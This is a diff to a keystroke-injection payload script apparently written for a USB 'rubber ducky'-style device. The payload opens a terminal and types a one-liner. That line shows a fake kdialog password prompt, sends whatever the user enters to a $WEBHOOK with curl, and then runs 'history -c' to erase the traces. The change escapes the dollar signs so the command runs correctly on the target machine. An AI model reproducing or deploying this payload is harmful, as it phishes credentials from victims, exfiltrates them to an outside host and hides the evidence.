@@ -28,5 +28,5 @@ QUACK CTRL-ALT t
 QUACK DELAY 2000
 
 # All-in-one is important
-QUACK STRING $(curl -H \"Content-Type: application/json\" -X POST -d \"{'content': '$(kdialog --title $TITLE --password $CONTENT --default $PSWD)'}\" $WEBHOOK); history -c; exit;
+QUACK STRING \$(curl -H \"Content-Type: application/json\" -X POST -d \"{'content': '\$(kdialog --title $TITLE --password $CONTENT --default $PSWD)'}\" $WEBHOOK); history -c; exit;
 QUACK ENTER
